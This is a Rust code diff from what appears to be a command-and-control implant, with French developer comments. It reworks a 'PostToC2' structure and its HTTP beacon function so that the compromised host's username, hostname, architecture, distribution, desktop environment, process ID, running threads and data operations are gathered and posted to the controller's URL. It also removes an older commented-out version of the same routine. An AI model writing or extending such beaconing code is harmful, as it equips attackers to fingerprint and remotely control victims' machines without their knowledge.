@@ -408,20 +408,26 @@ impl LinkFetch for HTTPLink {
 
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+pub struct LightPayload {
+    pub todo: String
+
+
+}
+
+#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub struct PostToC2 {
     pub session_id: String,
-    pub username: String,
     pub hostname: String,
+    pub username: String,
     pub arch: String,
     pub distro: String,
     pub desktop_env: String,
-    //pub running_thread: Vec<String>,
-    pub running_thread: Vec<Payload>,
-    //pub config: String,
-    //pub loader_name: String,
-    //pub working_link: String,
+    pub pid: u32,
+    pub data_operation: Vec<DataOperation>,
+    pub running_thread: Vec<String>,
 }
 
+use std::process;
 
 impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
@@ -437,14 +443,16 @@ impl LinkFetch for HTTPPostC2Link {
 
         let yolo: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
-            username: whoami::username(),
             hostname: whoami::devicename(),
+            username: whoami::username(),
             arch: whoami::arch().to_string(),
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
-            running_thread: running_thread.clone(),
-            //running_thread: tt,
-                };
+            pid: process::id(),
+            data_operation: self.dataoperation.clone(),
+            running_thread: tt.clone(),
+            //running_thread: running_thread.clone(),
+        };
 
         // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
         //map.insert("config", format!("{:?}", config));
@@ -464,37 +472,6 @@ impl LinkFetch for HTTPPostC2Link {
         Ok(body)
     }
 
-    /* 
-    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
-    ) -> Result<Vec<u8>, anyhow::Error> {
-        let mut map: HashMap<&str, String> = HashMap::new();
-
-        map.insert("username", whoami::username());
-        map.insert("distro", whoami::distro());
-        map.insert("desktop_env", whoami::desktop_env().to_string());
-        map.insert("arch", whoami::arch().to_string());
-        map.insert("hostname", whoami::devicename());
-        map.insert("session_id", session_id.to_string());
-        // TODO comment transformer en jolie JSON ici ? ->  serde_json::to_string(running_thread).unwrap();
-        map.insert("running-thread", format!("{:?}", running_thread));
-        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
-        map.insert("config", format!("{:?}", config));
-        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
-        map.insert("loader", "todo".to_string());
-        //TODO send real data
-        map.insert("working-link", "todo".to_string());
-
-        let client = reqwest::blocking::Client::builder()
-            .timeout(Duration::from_secs(TIMEOUT))
-            .user_agent(USER_AGENT)
-            .build()?;
-
-        let mut res = client.post(&self.get_target()).json(&map).send()?;
-        let mut body: Vec<u8> = Vec::new();
-        res.read_to_end(&mut body)?;
-        Ok(body)
-    }
-    */
     fn get_target(&self) -> String {
         format!("{}", self.url)
     }
